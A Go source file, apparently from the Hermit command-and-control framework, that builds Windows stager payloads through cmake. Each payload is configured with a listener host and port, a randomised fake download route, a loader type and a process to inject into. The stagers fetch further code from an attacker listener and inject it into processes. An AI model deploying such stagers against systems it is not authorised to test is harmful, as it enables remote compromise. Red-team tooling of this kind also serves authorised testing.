package payload

import (
	"fmt"
	"os"
	"slices"

	"github.com/google/uuid"
	"github.com/hideckies/hermit/pkg/common/meta"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/server/listener"
	"github.com/hideckies/hermit/pkg/server/state"
)

type Stager struct {
	Id        uint
	Uuid      string
	Name      string
	Os        string
	Arch      string
	Format    string
	Lprotocol string
	Lhost     string
	Lport     uint16
	Type      string // "dll-loader", "exec-loader", "shellcode-loader"
	Technique string
	Process   string // process name to inject
}

func NewStager(
	id uint,
	_uuid string,
	name string,
	os string,
	arch string,
	format string,
	lprotocol string,
	lhost string,
	lport uint16,
	stgType string,
	technique string,
	process string,
) *Stager {
	if _uuid == "" {
		_uuid = uuid.NewString()
	}
	if name == "" {
		name = utils.GenerateRandomAnimalName(false, fmt.Sprintf("stager-%s", stgType))
	}

	return &Stager{
		Id:        id,
		Uuid:      _uuid,
		Name:      name,
		Os:        os,
		Arch:      arch,
		Format:    format,
		Lprotocol: lprotocol,
		Lhost:     lhost,
		Lport:     lport,
		Type:      stgType,
		Technique: technique,
		Process:   process,
	}
}

func (s *Stager) Generate(serverState *state.ServerState) (data []byte, outFile string, err error) {
	// Get the correspoiding listener
	liss, err := serverState.DB.ListenerGetAll()
	if err != nil {
		return nil, "", err
	}
	var lis *listener.Listener = nil
	for _, _lis := range liss {
		if _lis.Protocol == s.Lprotocol && (_lis.Addr == s.Lhost || slices.Contains(_lis.Domains, s.Lhost)) && _lis.Port == s.Lport {
			lis = _lis
			break
		}
	}
	if lis == nil {
		return nil, "", fmt.Errorf("the corresponding listener not found")
	}

	// Get output path
	payloadsDir, err := meta.GetPayloadsDir(lis.Name, false)
	if err != nil {
		return nil, "", err
	}
	outFile = fmt.Sprintf("%s/%s.%s.%s", payloadsDir, s.Name, s.Arch, s.Format)

	// Get request path
	requestPathDownload := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/stager/download"])

	// Change to the paylaod directory
	if s.Os == "linux" {
		return nil, "", fmt.Errorf("linux target is not implemented yet")
	} else if s.Os == "windows" {
		// Change directory
		os.Chdir("./payload/win/stager")
		_, err = meta.ExecCommand("rm", "-rf", "build")
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", err
		}

		_, err = meta.ExecCommand(
			"cmake",
			fmt.Sprintf("-DOUTPUT_DIRECTORY=%s", payloadsDir),
			fmt.Sprintf("-DPAYLOAD_NAME=%s", s.Name),
			fmt.Sprintf("-DPAYLOAD_ARCH=%s", s.Arch),
			fmt.Sprintf("-DPAYLOAD_FORMAT=%s", s.Format),
			fmt.Sprintf("-DPAYLOAD_TYPE=\"%s\"", s.Type),
			fmt.Sprintf("-DPAYLOAD_TECHNIQUE=\"%s\"", s.Technique),
			fmt.Sprintf("-DPAYLOAD_PROCESS=\"%s\"", s.Process),
			fmt.Sprintf("-DLISTENER_HOST=\"%s\"", s.Lhost),
			fmt.Sprintf("-DLISTENER_PORT=%s", fmt.Sprint(s.Lport)),
			fmt.Sprintf("-DREQUEST_PATH_DOWNLOAD=\"%s\"", requestPathDownload),
			"-S.",
			"-Bbuild",
		)
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", fmt.Errorf("create build directory error: %v", err)
		}
		_, err = meta.ExecCommand(
			"cmake",
			"--build", "build",
			"--config", "Release",
			"-j", fmt.Sprint(serverState.NumCPU),
		)
		if err != nil {
			os.Chdir(serverState.CWD)
			return nil, "", fmt.Errorf("build error: %v", err)
		}
	}

	data, err = os.ReadFile(outFile)
	if err != nil {
		os.Chdir(serverState.CWD)
		return nil, "", err
	}

	// Go back to the current directory
	os.Chdir(serverState.CWD)

	return data, outFile, nil
}
